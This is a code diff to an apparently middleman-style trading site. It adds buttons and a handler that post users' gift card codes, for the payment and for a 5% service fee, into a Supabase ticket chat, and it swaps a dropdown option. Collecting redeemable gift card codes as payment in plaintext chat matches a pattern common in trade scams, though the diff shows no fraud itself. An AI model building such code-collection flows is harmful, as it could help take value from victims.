@@ -1566,7 +1566,8 @@ if (paymentMethod === "GIFT_CARD") {
     <p style="font-size:13px;color:#9aa4b2;margin:0 0 12px;">Selected card: <strong style="color:#2bd4bd;">${giftCardBrand}</strong></p>
     <label for="mainGiftCardCode" style="display:block;font-size:12px;color:#9aa4b2;margin-bottom:6px;">Gift Card Code</label>
     <input id="mainGiftCardCode" class="chat-input" type="text" placeholder="Enter ${giftCardBrand} code" autocomplete="off" style="width:100%;box-sizing:border-box;margin-bottom:10px;" />
-    <p style="font-size:12px;color:#9aa4b2;margin:0;">Submit the code directly to the middleman for verification before proceeding.</p>
+    <button id="submitMainGiftCardCode" class="copy-btn" type="button" style="width:100%;">Submit Code</button>
+    <p style="font-size:12px;color:#9aa4b2;margin:8px 0 0;">The middleman must verify the code before proceeding.</p>
   </div>`;
 }
 
@@ -1614,7 +1615,8 @@ if (paymentMethod === "GIFT_CARD") {
       <p><strong>Service Fee (5%):</strong> ${pricing.fee} ${currency}</p>
       <label for="feeGiftCardCode" style="display:block;font-size:12px;color:#9aa4b2;margin-bottom:6px;">${feeGiftCardBrand} Gift Card Code</label>
       <input id="feeGiftCardCode" class="chat-input" type="text" placeholder="Enter ${feeGiftCardBrand} code for the fee" autocomplete="off" style="width:100%;box-sizing:border-box;margin-bottom:10px;" />
-      <p style="font-size:12px;color:#9aa4b2;margin:0;">Submit the code directly to the middleman for verification.</p>
+      <button id="submitFeeGiftCardCode" class="copy-btn" type="button" style="width:100%;">Submit Code</button>
+      <p style="font-size:12px;color:#9aa4b2;margin:8px 0 0;">The middleman must verify the code before proceeding.</p>
     </div>`;
   }
 }
@@ -2600,6 +2602,58 @@ document.addEventListener("click", function(e) {
     });
   }
 
+  // Gift card submit buttons: send the entered code to the current ticket chat
+  if (e.target && (e.target.id === "submitMainGiftCardCode" || e.target.id === "submitFeeGiftCardCode")) {
+    const submitBtn = e.target;
+    const isFeeCode = submitBtn.id === "submitFeeGiftCardCode";
+    const inputId = isFeeCode ? "feeGiftCardCode" : "mainGiftCardCode";
+    const codeInput = document.getElementById(inputId);
+    const giftCardCode = codeInput ? codeInput.value.trim() : "";
+
+    if (!giftCardCode) {
+      if (codeInput) {
+        codeInput.focus();
+        codeInput.placeholder = "Enter the Gift Card code first";
+      }
+      return;
+    }
+    if (!currentTicketId || !currentRole) {
+      alert("Open the ticket chat before submitting the Gift Card code.");
+      return;
+    }
+    if (submitBtn.dataset.sending === "true") return;
+
+    submitBtn.dataset.sending = "true";
+    submitBtn.disabled = true;
+    const originalLabel = submitBtn.innerText;
+    submitBtn.innerText = "Sending...";
+    const messageText = `${isFeeCode ? "Service fee" : "Main payment"} Gift Card code submitted for verification: ${giftCardCode}`;
+
+    (async () => {
+      const { error } = await supabase.from("messages").insert([{
+        ticket_id: currentTicketId,
+        sender: currentRole,
+        text: messageText,
+        topic: "chat",
+        extension: "text"
+      }]);
+
+      if (error) {
+        console.error("GIFT CARD CODE SUBMIT ERROR:", error);
+        alert("Could not submit the Gift Card code. Please try again.");
+        return;
+      }
+
+      displayMessage({ role: currentRole, content: messageText, extension: "text" });
+      codeInput.value = "";
+      submitBtn.innerText = "Submitted ✓";
+      setTimeout(() => { submitBtn.innerText = originalLabel; }, 2000);
+    })().finally(() => {
+      submitBtn.dataset.sending = "false";
+      submitBtn.disabled = false;
+    });
+  }
+
   // Separate service-fee copy buttons
   const copyTargets = {
     copyFeeWalletBtn: "feeUsdtWallet",
@@ -3117,7 +3171,7 @@ loadReviews();
     <option value="Google Play">Google Play</option>
     <option value="Amazon">Amazon</option>
     <option value="Razer Gold">Razer Gold</option>
-    <option value="Other">Other</option>
+    <option value="Binance">Binance</option>
   </select>
 
   <div style="background:#121826;border:1px solid #293449;border-radius:12px;padding:12px;margin-top:10px;">
@@ -3147,7 +3201,7 @@ loadReviews();
         <option value="Google Play">Google Play</option>
         <option value="Amazon">Amazon</option>
         <option value="Razer Gold">Razer Gold</option>
-        <option value="Other">Other</option>
+        <option value="Binance">Binance</option>
       </select>
     </div>
   </div>
